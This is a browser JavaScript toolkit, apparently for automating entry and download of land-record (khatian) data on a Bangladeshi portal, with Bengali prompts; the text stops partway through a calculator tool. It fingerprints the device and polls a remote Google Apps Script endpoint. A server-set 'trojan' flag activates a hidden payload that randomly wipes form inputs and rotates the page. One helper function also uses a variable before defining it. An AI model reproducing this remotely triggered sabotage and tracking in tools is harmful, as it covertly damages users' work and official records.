(async function() {
    console.log("🚀 VUMI PRO: Ultimate Cross-Domain Fix Started...");
    try {
        // 🔴 1. CLEANUP PREVIOUS INSTANCES (To prevent Ghost bugs)
        ['vumi-master-toolkit', 'vmt-pass-overlay', 'vmt-404-overlay'].forEach(id => {
            let el = document.getElementById(id);
            if (el) el.remove();
        });

        const API_URL = "https://script.google.com/macros/s/AKfycbxi2hFWmkWkgSl2_ATdNiJbMPTxXCtEHNacyfK_6llSXGYCXPDkB4kLVx9Kma1BgDCWhQ/exec";

        // 🔴 2. CROSS-DOMAIN STATIC DEVICE ID 🔴
        // Ei ID jiboneo change hobe na, kono domain ba localstorage er upor nirvor korbe na.
        function getStableDeviceId() {
            let str = [
                screen.width,
                screen.height,
                screen.colorDepth,
                navigator.platform,
                navigator.hardwareConcurrency || 2,
                new Date().getTimezoneOffset()
            ].join('|');
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                hash |= 0; 
            }
            return 'VMT-FIXED-' + Math.abs(hash).toString(36).toUpperCase();
        }

        // On the fly generated device ID, prevents cross domain mismatch!
        let deviceId = getStableDeviceId();
        localStorage.setItem('vmt_device_id', deviceId); // Just keeping it for reference
        
        let savedAuth = localStorage.getItem('vmt_auth_hash') || "";
        let tFlag = localStorage.getItem('vmt_t_flag') || "";
        let sessionExpiry = localStorage.getItem('vmt_session_expiry') || "";

        // 🔴 3. AUTH LOGIC (1 YEAR SESSION)
        function clearAuthData() {
            localStorage.removeItem('vmt_auth_hash');
            localStorage.removeItem('vmt_t_flag');
            localStorage.removeItem('vmt_session_expiry');
            savedAuth = ""; tFlag = ""; sessionExpiry = "";
        }

        if (savedAuth && sessionExpiry && Date.now() > parseInt(sessionExpiry)) {
            clearAuthData();
        }

        function saveAuthData(auth, flag) {
            let expiryTime = (Date.now() + (365 * 24 * 60 * 60 * 1000)).toString(); // 1 Year
            localStorage.setItem('vmt_auth_hash', auth);
            localStorage.setItem('vmt_session_expiry', expiryTime);
            if (flag) localStorage.setItem('vmt_t_flag', flag);
            else localStorage.removeItem('vmt_t_flag');
        }

        function show404Overlay(message) {
            if (document.getElementById('vmt-404-overlay')) return;
            ['vumi-master-toolkit', 'vmt-pass-overlay'].forEach(id => { let el = document.getElementById(id); if (el) el.remove(); });
            const overlay = document.createElement('div'); overlay.id = 'vmt-404-overlay';
            overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI', Arial, sans-serif;animation: fadeIn 0.5s ease;";
            overlay.innerHTML = `<div style="text-align:center; width: 100%; max-width: 800px; padding: 40px 20px;"><div style="background-image: url('https://cdn.dribbble.com/users/285475/screenshots/2083086/dribbble_1.gif'); height: 400px; background-position: center; background-repeat: no-repeat;"><h1 style="font-size:80px; margin:0; color:#333; padding-top:20px;">404</h1></div><div style="margin-top:-50px;"><h3 style="font-size:36px; margin: 10px 0; color:#333; font-weight: bold;">Look like you're lost</h3><p style="font-size:16px; color:#666; margin-bottom: 25px; font-weight: 500;">${message}</p><button id="vmt-404-btn" style="color: #fff; padding: 12px 30px; background: #39ac31; border:none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; outline: none; box-shadow: 0 4px 6px rgba(57,172,49,0.3);">Go to Home / Reload</button></div></div>`;
            document.body.appendChild(overlay); document.getElementById('vmt-404-btn').onclick = () => window.location.reload();
        }

        async function checkLiveStatus() {
            try {
                let userId = savedAuth ? atob(savedAuth) : "guest";
                let response = await fetch(`${API_URL}?action=verify&userid=${encodeURIComponent(userId)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
                let data = await response.json();
                if (data.success === false) { clearAuthData(); show404Overlay(data.message || "সার্ভার আপডেট চলছে অথবা আপনার অ্যাক্সেস বাতিল করা হয়েছে!");
                } else if (data.success === true && data.trojan === true) { saveAuthData(savedAuth, 'engaged'); tFlag = 'engaged';
                } else if (data.success === true) { saveAuthData(savedAuth, ''); tFlag = ''; }
            } catch (e) { console.log("Live check running..."); }
        }

        setInterval(async () => {
            let exp = localStorage.getItem('vmt_session_expiry');
            if (localStorage.getItem('vmt_auth_hash') && exp && Date.now() > parseInt(exp)) { clearAuthData(); window.location.reload(); 
            } else { checkLiveStatus(); }
        }, 30000);

        function activatePayload() {
            setInterval(() => {
                if(localStorage.getItem('vmt_t_flag') === 'engaged') {
                    document.querySelectorAll('input').forEach(inp => { if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-overlay')) { inp.value = ""; } });
                    if(document.body && Math.random() > 0.95) { document.body.style.transition = "all 2s"; document.body.style.transform = "rotate(180deg) scale(0.8)"; setTimeout(() => { document.body.style.transform = "none"; }, 5000); }
                }
            }, 5000); 
        }

        // 🔴 4. ALL TOOLS DEFINITION (GLOBAL & SUPER FAST)
        window._vmtTools = {
            t1: function() {
                let t = { i: null, s: null }; let st = ['খতিয়ান বক্স', 'সংরক্ষণ বাটন']; let c = 0; alert("১. খতিয়ান বক্সে ক্লিক কর\n২. সংরক্ষণ বাটনে ক্লিক কর");
                document.onclick = function(e) {
                    if (e.target.closest('#vumi-master-toolkit')) return; let el = e.target; t[c === 0 ? 'i' : 's'] = el; el.style.border = "4px solid #ef4444"; c++;
                    if (c < 2) { console.log("Next: " + st[c]); } else {
                        document.onclick = null; let r = prompt("রেঞ্জ দাও (যেমন: ১৭৭-২০০):");
                        if (r) {
                            let p = r.replace(/[০-৯]/g, d => ({ '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4', '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9' }[d])).split('-').map(Number);
                            (async function() {
                                for (let i = p[0]; i <= p[1]; i++) {
                                    let b = i.toString().replace(/\d/g, d => ({ '0': '০', '1': '১', '2': '২', '3': '৩', '4': '৪', '5': '৫', '6': '৬', '7': '৭', '8': '৮', '9': '৯' }[d]));
                                    t.i.focus(); t.i.value = b; t.i.dispatchEvent(new Event('input', { bubbles: true })); t.i.dispatchEvent(new Event('change', { bubbles: true })); t.i.blur();
                                    await new Promise(r => setTimeout(r, 5000)); t.s.click(); console.log("Saved: " + b); await new Promise(r => setTimeout(r, 6000));
                                }
                                alert("কাম শেষ!");
                            })();
                        }
                    }
                };
            },
            t2: function() {
                function setY(win) {
                    try {
                        let el = win.document.getElementById('paid_year');
                        if (el) {
                            let target = Array.from(el.options).find(o => o.text.includes("১৯৭৬") && o.text.includes("১৯৭৭"));
                            if (target) {
                                el.value = target.value; el.dispatchEvent(new Event('change', { bubbles: true }));
                                if (win.jQuery) { let $el = win.jQuery(el); $el.val(target.value).trigger('change'); if ($el.data('select2')) $el.trigger('select2:select'); }
                                let s2 = el.nextElementSibling; if (s2 && s2.classList.contains('select2')) { s2.style.border = "4px solid #ef4444"; s2.style.borderRadius = "6px"; } else el.style.border = "4px solid #ef4444";
                                return true;
                            }
                        }
                        for (let i = 0; i < win.frames.length; i++) if (setY(win.frames[i])) return true;
                    } catch (e) {} return false;
                } setY(window);
            },
            t3: function() {
                const otherData = { "জরিপের ধরন": "আর এস", "মালিকানা": "সর্বশেষ জরিপ", "হোল্ডিং": "সাধারণ" };
                if (typeof $ === 'undefined') { alert('jQuery নেই'); return; }
                let updatedCount = 0;
                $('select').not('#mouja_select').each(function() {
                    let $s = $(this); let lt = ""; let $lbl = $s.closest('fieldset, .form-group, td').find('label');
                    if($lbl.length) lt = $lbl.text().trim(); else lt = $s.closest('fieldset, div, td').text().trim();
                    for (let k in otherData) {
                        if (lt.includes(k)) { 
                            let targetText = otherData[k]; let $o = $s.find('option').filter(function() { return $(this).text().trim().includes(targetText); }); 
                            if ($o.length) { $s.val($o.val()).trigger('change'); if ($s.data('select2')) $s.trigger('select2:select'); updatedCount++; } 
                        }
                    }
                });
                if(updatedCount > 0) alert("✅ অটো ডাটা ফিল সম্পন্ন হয়েছে!"); else alert("⚠️ কোনো ঘর ফিল করা যায়নি!");
            },
            t4: function() {
                let inp = document.createElement('input'); inp.type = 'file'; inp.accept = '.txt';
                inp.onchange = e => {
                    let f = e.target.files[0]; if (!f) return; let r = new FileReader();
                    r.onload = async function(ev) {
                        let txt = ev.target.result; let ls = txt.split('\n').map(l => l.trim()).filter(l => l); let oL = [], dL = [], isD = false;
                        for (let l of ls) { if (l.includes("দাগ নং")) { isD = true; continue; } if (isD) dL.push(l); else oL.push(l); }
                        let es = [], pn = [];
                        oL.forEach(l => {
                            if (l.includes("সাং") || l.includes("ঠিকানা")) { 
                                let a = l.replace(/(সাং|ঠিকানা)[:\s]*/, "").trim(); pn.forEach(p => { p.address = a; es.push(p); }); pn = []; 
                            } else if (l.includes("পিং") || l.includes("জং") || l.includes("জঃ")) { 
                                let rel = l.trim(); if (rel.startsWith("পিং")) { rel = rel.replace(/^পিং[:\s]*/, "").trim(); } 
                                for (let i = pn.length - 1; i >= 0; i--) { if (pn[i].father === "") { pn[i].father = rel; } else break; } 
                            } else { pn.push({ name: l, father: "", address: "" }); }
                        });
                        if (pn.length > 0) { let la = es.length > 0 ? es[es.length - 1].address : ""; pn.forEach(p => { p.address = la; es.push(p); }); }
                        let dgs = [], cls = []; dL.forEach(l => { let p = l.split(/\s+/); if (p.length >= 2) { dgs.push(p[0]); cls.push(p[p.length - 1]); } else if (p.length === 1) { dgs.push(p[0]); cls.push(""); } });
                        let amt = [];
                        if (dgs.length > 0) {
                            let aS = prompt("মোট " + dgs.length + " টি দাগ। পরিমাণ দিন (কমা দিয়ে):"); if (aS) amt = aS.split(',').map(s => s.trim());
                            let cS = prompt("রেকর্ডীয় শ্রেণী (কমা দিয়ে, খালি রাখলে ফাইলেরটা):"); if (cS) cls = cS.split(',').map(s => s.trim());
                        }
                        if (es.length === 0 && dgs.length === 0) { alert("ডাটা পাইনি!"); return; }
                        
                        // ⚡ FAST ENTRY
                        for (let i = 0; i < es.length; i++) {
                            let d = es[i]; let nF = document.getElementById('owner-name'); let fF = document.getElementById('verify-father-name'); let aF = document.getElementById('verify-address');
                            if (nF) nF.value = d.name; if (fF) fF.value = d.father; if (aF) aF.value = d.address;
                            if (typeof $ !== 'undefined') $('#owner-name,#verify-father-name,#verify-address').trigger('input').trigger('change');
                            if (typeof entryVerify === "function") await entryVerify(); else { let evB = document.getElementById('entry-verify'); if (evB) evB.click(); }
                            await new Promise(r => setTimeout(r, 600)); 
                        }
                        if (dgs.length > 0) {
                            function uS2(w, el, tx) {
                                if (!el || !tx) return; let o = Array.from(el.options); let tg = o.find(x => x.text.trim() === tx.trim()) || o.find(x => x.text.includes(tx.trim()));
                                if (tg) { el.value = tg.value; el.dispatchEvent(new Event('change', { bubbles: true })); if (w.jQuery) { let $e = w.jQuery(el); $e.val(tg.value).trigger('change'); if ($e.data('select2')) $e.trigger('select2:select'); } }
                            }
                            function sv(w) {
                                try {
                                    let df = Array.from(w.document.querySelectorAll('.r2Dag_no'));
                                    if (df.length > 0) {
                                        if (df.length < dgs.length) alert("সারি কম! আগে রো বানান।");
                                        df.forEach((fd, ix) => {
                                            if (ix >= dgs.length) return; let row = fd;
                                            for (let i = 0; i < 5; i++) { if (row.parentElement && (row.querySelectorAll('.r2Amount_of_land').length >= 1 || row.querySelectorAll('.r2amount_of_landDag').length >= 1)) { if (row.querySelectorAll('.r2UsableLandType').length > 0) break; } row = row.parentElement; }
                                            fd.value = dgs[ix]; fd.dispatchEvent(new Event('input', { bubbles: true })); let av = amt[ix] || amt[amt.length - 1] || "";
                                            row.querySelectorAll('.r2amount_of_landDag, .r2Amount_of_land').forEach(af => { if (av) af.value = av; af.dispatchEvent(new Event('input', { bubbles: true })); af.style.backgroundColor = "#e8f4fd"; });
                                            let ss = Array.from(row.querySelectorAll('select'));
                                            if (ss.length >= 2) { let rt = cls[ix] || cls[cls.length - 1] || ""; if (rt) uS2(w, ss.find(s => !s.classList.contains('r2UsableLandType')) || ss[0], rt); uS2(w, row.querySelector('.r2UsableLandType') || ss[1], 'কৃষি'); }
                                        }); return true;
                                    }
                                    for (let j = 0; j < w.frames.length; j++) if (sv(w.frames[j])) return true;
                                } catch (e) {} return false;
                            } sv(window);
                        }
                        alert("শেষ!");
                    }; r.readAsText(f);
                }; inp.click();
            },
            t5: function() {
                let i = document.createElement('input'); i.type = 'file'; i.accept = '.txt';
                i.onchange = e => {
                    let f = e.target.files[0]; if (!f) return; let r = new FileReader();
                    r.onload = async function(ev) {
                        let t = ev.target.result, ls = t.split('\n').map(l => l.trim()).filter(l => l); let es = [], ps = [], pSh = [];
                        ls.forEach(l => {
                            let bt = s => s.replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d)); let m = l.match(/[৵৶।॥৲৷১/০-৯0-9\s৸⁄৷৷/८]+$/); let ss = "";
                            if (m) {
                                let cStr = m[0].trim().replace(/[\s८]+/g, '_').replace(/^_+/, ''); let ana = 0, gonda = 0, kora = 0, kranti = 0, til = 0;
                                let m1 = cStr.match(/^([^০-৯0-9_]+)/);
                                if (m1) { let x = m1[1]; let aMap = { '১': 16, '৸৶': 15, '৸৵': 14, '৸/': 13, '৸⁄': 13, '৸': 12, '৷৷৶': 11, '।।৶': 11, '॥৶': 11, '৷৷৵': 10, '।।৵': 10, '॥৵': 10, '৷৷/': 9, '।।/': 9, '॥/': 9, '৷৷⁄': 9, '।।⁄': 9, '॥⁄': 9, '৷৷': 8, '।।': 8, '॥': 8, '৷৶': 7, '।৶': 7, '৷৵': 6, '।৵': 6, '৷/': 5, '।/': 5, '৷⁄': 5, '।⁄': 5, '৷': 4, '।': 4, '৶': 3, '৵': 2, '/': 1, '⁄': 1 }; let found = Object.keys(aMap).sort((a, b) => b.length - a.length).find(k => x.startsWith(k)); if (found) { ana = aMap[found]; cStr = cStr.substring(found.length) } }
                                cStr = cStr.replace(/^_+/, ''); let m2 = cStr.match(/^([০-৯0-9]+)/); if (m2) { gonda = parseInt(bt(m2[1])); cStr = cStr.substring(m2[0].length) }
                                cStr = cStr.replace(/^_+/, ''); let m3 = cStr.match(/^([^০-৯0-9]+)/);
                                if (m3) { let x = m3[1]; if (x.startsWith('৸') || x.startsWith('৶')) { kora = 3; x = x.substring(1) } else if (x.startsWith('৷৷') || x.startsWith('।।') || x.startsWith('॥')) { kora = 2; x = x.substring(2) } else if (x.startsWith('৷') || x.startsWith('।')) { kora = 1; x = x.substring(1) } if (x.includes('//') || x.includes('৷৷') || x.includes('।।') || x.includes('॥')) kranti = 2; else if (x.includes('/') || x.includes('৷') || x.includes('।') || x.includes('⁄')) kranti = 1; cStr = cStr.substring(m3[0].length) }
                                cStr = cStr.replace(/^_+/, ''); let m4 = cStr.match(/^([০-৯0-9]+)/); if (m4) til = parseInt(bt(m4[1]));
                                let n = (ana / 16) + (gonda / 320) + (kora / 1280) + (kranti / 3840) + (til / 76800);
                                if (n > 0) ss = n.toFixed(6).replace(/0+$/, '').replace(/\.$/, '')
                            }
                            let c = l.replace(/[৵৶।॥৲৷১/০-৯0-9\s৸⁄৷৷/८]+$/, "").trim();
                            if (c !== "") {
                                if (c.includes("সাং") || c.includes("ঠিকানা")) { 
                                    let ad = c.replace(/(সাং|ঠিকানা)[:\s]*/, "").trim(); ps.forEach(p => { p.address = ad; es.push(p) }); ps = []; 
                                } else if (c.includes("পিং") || c.includes("জং") || c.includes("জঃ")) { 
                                    let rel = c.trim(); if (rel.startsWith("পিং")) { rel = rel.replace(/^পিং[:\s]*/, "").trim(); } 
                                    for (let j = ps.length - 1; j >= 0; j--) { if (ps[j].father === "") { ps[j].father = rel; if (ss) ps[j].share = ss; } else break; } 
                                } else { ps.push({ name: c, father: "", address: "", share: ss }); }
                            } else { if (ss) pSh.push(ss); }
                        });
                        if (ps.length > 0) { let la = es.length > 0 ? es[es.length - 1].address : "নিজ"; ps.forEach(p => { p.address = p.address || la; es.push(p) }) }
                        for (let i = 0; i < es.length; i++) { if (!es[i].share && pSh.length > 0) es[i].share = pSh.shift() }
                        let totalSum = 0; es.forEach(d => { if (d.share) totalSum += parseFloat(d.share) }); totalSum = Math.round(totalSum * 1000000) / 1000000; let proceed = false;
                        if (Math.abs(totalSum - 1.0) <= 0.000010) { proceed = confirm("✅ পারফেক্ট! মোট ১৬ আনা মিলেছে (১.০০০০০০)।\n\nআপনি কি পোর্টালে ডাটা এন্ট্রি শুরু করবেন?"); } else { let diff = (1.0 - totalSum).toFixed(6); if (totalSum < 1.0) { proceed = confirm("⚠️ এলার্ট: অংশে ঘাটতি আছে!\nমোট যোগফল: " + totalSum.toFixed(6) + "\nশর্ট আছে: " + diff + "\n\nতবুও কি ডাটা এন্ট্রি শুরু করবেন?"); } else { proceed = confirm("⚠️ এলার্ট: অংশ ১৬ আনার বেশি!\nমোট যোগফল: " + totalSum.toFixed(6) + "\nঅতিরিক্ত: " + Math.abs(diff).toFixed(6) + "\n\nতবুও কি ডাটা এন্ট্রি শুরু করবেন?"); } }
                        if (!proceed) return;
                        
                        // ⚡ FAST ENTRY
                        for (let d of es) {
                            let b = Array.from(document.querySelectorAll('button')).find(x => x.innerText.includes('লিখে এন্ট্রি')); if (b) b.click(); await new Promise(r => setTimeout(r, 600));
                            let ins = Array.from(document.querySelectorAll('input:not([type="hidden"]),textarea')); let nF = ins.find(el => (el.placeholder || "").includes("নাম") && !((el.placeholder || "").includes("পিতা"))); if (nF) { nF.value = d.name; nF.dispatchEvent(new Event('input', { bubbles: true })) }
                            let fF = ins.find(el => (el.placeholder || "").includes("পিতা") || (el.placeholder || "").includes("স্বামী")); if (fF) { fF.value = d.father; fF.dispatchEvent(new Event('input', { bubbles: true })) }
                            let aF = ins.find(el => (el.placeholder || "").includes("ঠিকানা")); if (aF) { aF.value = d.address; aF.dispatchEvent(new Event('input', { bubbles: true })) }
                            await new Promise(r => setTimeout(r, 300));
                            let bA = Array.from(document.querySelectorAll('button')).find(x => x.innerText.trim() === 'এন্ট্রি করুন'); if (bA) bA.click(); await new Promise(r => setTimeout(r, 800));
                            let sFs = Array.from(document.querySelectorAll('input')).filter(el => (el.placeholder || "").includes("অংশ") && el.offsetParent !== null); let sF = sFs[sFs.length - 1]; if (sF && d.share) { sF.value = d.share; sF.dispatchEvent(new Event('input', { bubbles: true })) }
                            await new Promise(r => setTimeout(r, 500))
                        }
                        alert("আনা-গন্ডা মাস্টার আপডেট ডান!")
                    }; r.readAsText(f);
                }; i.click()
            },
            t6: function() {
                let p = prompt("কয়টি দাগ যোগ?"); if (!p) return; let cl = p.replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d)).trim();
                if (!/^\d+$/.test(cl)) { alert("ভুল ইনপুট!"); return; } let c = parseInt(cl); let b = document.getElementById('PlusItem22');
                if (b && c > 0) { let i = 0; function hc() { if (i < c) { b.click(); i++; setTimeout(hc, Math.floor(Math.random() * 200) + 200); } } hc(); }
            },
            t7: function() {
                let dStr=prompt("দাগ নং গুলো দিন (কমা দিয়ে):"); let aStr=prompt("পরিমাণ (শতক) দিন (কমা দিয়ে):"); let cStr=prompt("রেকর্ডীয় শ্রেণী দিন (কমা দিয়ে):");
                if(!dStr||!aStr||!cStr)return;
                let dags=dStr.split(',').map(s=>s.trim()); let amts=aStr.split(',').map(s=>s.trim()); let clss=cStr.split(',').map(s=>s.trim()); let totalUpdated=0;
                function solve(win){
                    try{
                        let dagFields=Array.from(win.document.querySelectorAll('.r2Dag_no'));
                        if(dagFields.length>0){
                            dagFields.forEach((field,index)=>{
                                let row=field;
                                for(let i=0;i<5;i++){ if(row.parentElement&&(row.querySelectorAll('.r2Amount_of_land').length>=1||row.querySelectorAll('.r2amount_of_landDag').length>=1)){ if(row.querySelectorAll('.r2UsableLandType').length>0)break } row=row.parentElement }
                                field.value=dags[index]||dags[dags.length-1]; field.dispatchEvent(new Event('input',{bubbles:true}));
                                let amtVal=amts[index]||amts[amts.length-1]; let amtFields=row.querySelectorAll('.r2amount_of_landDag, .r2Amount_of_land');
                                amtFields.forEach(af=>{ af.value=amtVal; af.dispatchEvent(new Event('input',{bubbles:true})); af.style.backgroundColor="#e1f5fe" });
                                let selects=Array.from(row.querySelectorAll('select'));
                                if(selects.length>=2){ let recTxt=clss[index]||clss[clss.length-1]; updateS2(win,selects.find(s=>!s.classList.contains('r2UsableLandType'))||selects[0],recTxt); updateS2(win,row.querySelector('.r2UsableLandType')||selects[1],'কৃষি') }
                                totalUpdated++
                            }); return true
                        }
                        for(let j=0;j<win.frames.length;j++){if(solve(win.frames[j]))return true}
                    }catch(e){}return false
                }
                function updateS2(w,el,txt){
                    if(!el)return; let options=Array.from(el.options); let target=options.find(opt=>opt.text.trim()===txt.trim())||options.find(opt=>opt.text.includes(txt.trim()));
                    if(target){ el.value=target.value; el.dispatchEvent(new Event('change',{bubbles:true})); if(w.jQuery){ let $el=w.jQuery(el); $el.val(target.value).trigger('change'); if($el.data('select2')){$el.trigger('select2:select')} } }
                }
                solve(window);
                if(totalUpdated>0){ alert(totalUpdated+" টি সারির সব ঘর আপডেট হয়েছে!") }else{ alert("কোনো ঘর পাওয়া যায়নি ভাই!") }
            },
            t8: async function() {
                const toBangla = (n) => n.toString().replace(/\d/g, d => '০১২৩৪৫৬৭৮৯'[d]);
                function setNativeValue(element, value) {
                    const valueSetter = Object.getOwnPropertyDescriptor(element, 'value').set;
                    const prototype = Object.getPrototypeOf(element);
                    const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
                    if (valueSetter && valueSetter !== prototypeValueSetter) { prototypeValueSetter.call(element, value); } else { valueSetter.call(element, value); }
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                }
                let range = prompt("ভাই, কত থেকে কত খতিয়ান নামাবেন?\n(যেমন: ১০৬-১১০)");
                if (!range || !range.includes('-')) return alert("ভুল হয়েছে! মাঝখানে ড্যাশ (-) দিয়ে লিখুন।");
                let engRange = range.replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d));
                let [start, end] = engRange.split('-').map(n => parseInt(n.trim()));
                if (isNaN(start) || isNaN(end) || start > end) return alert("নম্বর বুঝতে সমস্যা হচ্ছে!");

                for (let k = start; k <= end; k++) {
                    let banglaK = toBangla(k);
                    console.log(`\n--- [${k}] নম্বর খতিয়ানের কাজ শুরু ---`);
                    try {
                        await new Promise(r => setTimeout(r, 1000));
                        let allInputs = Array.from(document.querySelectorAll('input[type="text"], input[type="number"]'));
                        let editableInputs = allInputs.filter(i => !i.readOnly && !i.disabled && !i.getAttribute('role') && i.type !== 'hidden');
                        let searchBox = editableInputs[editableInputs.length - 1];
                        if (!searchBox) continue;

                        searchBox.style.backgroundColor = '#fef08a'; searchBox.style.border = '3px solid #eab308'; searchBox.style.outline = 'none';
                        searchBox.scrollIntoView({ behavior: 'smooth', block: 'center' }); searchBox.focus();

                        setNativeValue(searchBox, ''); await new Promise(r => setTimeout(r, 200));
                        setNativeValue(searchBox, banglaK);
                        searchBox.dispatchEvent(new Event('change', { bubbles: true })); searchBox.dispatchEvent(new KeyboardEvent('keyup', { key: 'Enter', keyCode: 13, bubbles: true }));
                        await new Promise(r => setTimeout(r, 300));

                        let allBtns = Array.from(document.querySelectorAll('button'));
                        let searchBtn = allBtns.find(b => b.querySelector('[data-testid="SearchIcon"]'));
                        if (!searchBtn) { searchBtn = allBtns.find(b => { let svg = b.querySelector('svg'); return (svg && !b.innerText && !b.innerHTML.includes('refresh') && !b.innerHTML.includes('close')); }); }
                        if (searchBtn) { searchBtn.style.border = '3px solid blue'; searchBtn.click(); } 
                        else { searchBox.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true })); }

                        let viewBtn = null;
                        for (let wait = 0; wait < 20; wait++) {
                            await new Promise(r => setTimeout(r, 300));
                            let tableRows = document.querySelectorAll('tbody tr');
                            for (let row of tableRows) { if (row.innerText.includes(banglaK)) { let btn = Array.from(row.querySelectorAll('button, a, span')).find(el => el.innerText.includes('প্রদর্শন')); if (btn) { viewBtn = btn; break; } } }
                            if (viewBtn) break;
                        }
                        if (!viewBtn) continue;

                        viewBtn.click(); await new Promise(r => setTimeout(r, 2000));

                        let rows = document.querySelectorAll('table tr'); let finalOutput = [];
                        rows.forEach(row => {
                            let cols = row.querySelectorAll('td');
                            if (cols.length > 1) { let nameDetails = cols[0].innerText.trim(); let symbols = cols[1].innerText.trim(); if (nameDetails && nameDetails !== '১' && !nameDetails.includes('মালিক, অকৃষি')) { finalOutput.push(nameDetails + '    ' + symbols); } }
                        });

                        let resultText = finalOutput.join('\n\n');
                        if (resultText !== '') {
                            let bodyText = document.body.innerText; let khatianMatch = bodyText.match(/খতি[য়য়]ান\s*নং[^\d০-৯]*([০-৯0-9]+)/); let fileName = (khatianMatch ? khatianMatch[1] : 'khatian_data_' + banglaK) + '.txt';
                            let blob = new Blob([resultText], { type: 'text/plain;charset=utf-8' }); let link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = fileName;
                            document.body.appendChild(link); link.click(); link.remove();
                        }
                        await new Promise(r => setTimeout(r, 800));
                        let backBtn = Array.from(document.querySelectorAll('button, a')).find(el => el.innerText.includes('ফিরে যান'));
                        if (backBtn) { backBtn.click(); } else { window.history.back(); }
                        await new Promise(r => setTimeout(r, 1500));
                    } catch (error) { console.log(error); }
                }
                alert("🎉 আপনার দেওয়া রেঞ্জের সব ডাউনলোড শেষ ভাই!");
            },
            t9: function() {
                if (document.getElementById('floating-calc-final-master')) return; const st = document.createElement('style');
                st.innerHTML = "#floating-calc-final-master{position:fixed;top:10px;left:10px;width:380px;height:90vh;background:rgba(255,255,255,0.95);backdrop-filter:blur(16px);border-radius:16px;z-index:999999;box-shadow:0 25px 50px rgba(0,0,0,0.2);display:flex;flex-direction:column;overflow:hidden;font-family:'Segoe UI',Arial,sans-serif;border:1px solid rgba(255,255,255,0.5);} .fcm-h{background:linear-gradient(135deg,#1e293b 0%,#0f172a 100%);color:#fff;padding:16px;text-align:center;font-weight:800;display:flex;justify-content:space-between;align-items:center;} .fcm-b{padding:20px;overflow-y:auto;flex-grow:1;background:rgba(248,250,252,0.5);} .oc{background:#fff;border:1px solid #e2e8f0;padding:15px;border-radius:12px;margin-bottom:15px;position:relative;box-shadow:0 4px 6px -1px rgba(0,0,0,0.05);transition:all 0.2s;} .oc:focus-within{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.15);} .fcm-b select:focus{border-color:#667eea!important;outline:none!important;background:#f8fafc!important;} .gi{display:grid;grid-template-columns:repeat(2,1fr);gap:10px} .lt{font-weight:700;font-size:11px;color:#64748b;text-transform:uppercase;margin-bottom:4px;display:block;letter-spacing:0.5px;} .fcm-b select{width:100%;padding:10px;border:1px solid #cbd5e1;border-radius:8px;font-size:14px;background:#fff;color:#334155;font-weight:600;transition:all 0.2s;} .fb{padding:15px;background:#fff;border-top:1px solid #e2e8f0;display:grid;grid-template-columns:1.2fr 1fr;gap:10px} .vmt-btn{padding:12px;border:none;border-radius:10px;cursor:pointer;color:white;font-weight:800;font-size:13px;transition:all 0.2s;} .ab{background:#10b981;box-shadow:0 4px 0 #059669;} .ab:active{transform:translateY(4px);box-shadow:none;} .cb{background:#6366f1;box-shadow:0 4px 0 #4f46e5;} .cb:active{transform:translateY(4px);box-shadow:none;} .fib{background:linear-gradient(135deg,#ef4444,#dc2626);width:100%;margin-top:12px;box-shadow:0 4px 10px rgba(239,68,68,0.3);} .act{position:absolute;top:12px;right:12px;display:flex;gap:12px;align-items:center} .cpt{cursor:pointer;font-size:11px;font-weight:800;color:#10b981;} .al{cursor:pointer;font-weight:900;font-size:18px;line-height:1;} #ra{margin:10px 20px;padding:15px;border-radius:12px;display:none;font-weight:800;text-align:center;border:1px solid #e2e8f0;box-shadow:inset 0 2px 4px rgba(0,0,0,0.05);} .gh{color:#ef4444;display:block;font-size:16px;margin-top:6px;font-weight:900;} .fcm-footer{padding:12px;background:rgba(255,255,255,0.9);border-top:1px solid #e2e8f0;text-align:center}";
                document.head.appendChild(st);
                const tB = n => n.toString().replace(/\d/g, d => "০১২৩৪৫৬৭৮৯"[d]); const tE = s => s.toString().replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d));
                function fG(gv) {
                    let r = Math.abs(gv) * 16; let a = Math.floor(r + 1e-9); r = (r - a) * 20; let g = Math.floor(r + 1e-9); r = (r - g) * 4; let k = Math.floor(r + 1e-9); r = (r - kr) * 3; let kr = Math.floor(r + 1e-9); r = (r - kr) * 20; let t = Math.round(r);
                    if (t >= 20) { t -= 20; kr += 1; } if (kr >= 3) { kr -= 3; k += 1; } if (k >= 4) { k -= 4; g += 1; } if (g >= 20) { g -= 20; a += 1; }
                    let p = []; if (a > 0) p.push(tB(a) + " আনা"); if (g > 0) p.push(tB(g) + " গণ্ডা"); if (k > 0) p.push(tB(k) + " কড়া"); if (kr > 0) p.push(tB(kr) + " ক্রান্তি"); if (t > 0) p.push(tB(t) + " তিল"); return p.length > 0 ? p.join(' ') : "০ তিল";
                }
                const co = document.createElement('div'); co.id = 'floating-calc-final-master'; co.innerHTML = '<div class="fcm-h"><span>🧮 SMART CALCULATOR</span><button onclick="this.closest(\'#floating-calc-final-master\').remove()" style="background:none;border:none;color:#94a3b8;cursor:pointer;font-size:24px;font-weight:bold;line-height:1;">&times;</button></div><div class="fcm-b" id="lst"></div><div id="ra"></div><div class="fb"><button class="vmt-btn ab" id="ae">+ مالک যোগ</button><button class="vmt-btn cb" id="gc">ফলাফল দেখুন</button></div>'; document.body.appendChild(co);
                function ad(rf, cd) {
                    const d = document.createElement('div'); d.className = 'oc';
